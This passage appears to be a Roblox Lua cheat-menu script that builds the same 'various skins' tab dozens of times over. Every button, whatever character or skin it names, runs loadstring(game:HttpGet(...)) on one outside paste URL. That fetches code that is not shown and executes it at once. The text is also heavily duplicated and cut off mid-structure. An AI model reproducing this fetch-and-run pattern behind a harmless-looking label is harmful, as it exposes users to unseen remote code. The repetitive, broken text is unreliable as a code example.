    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
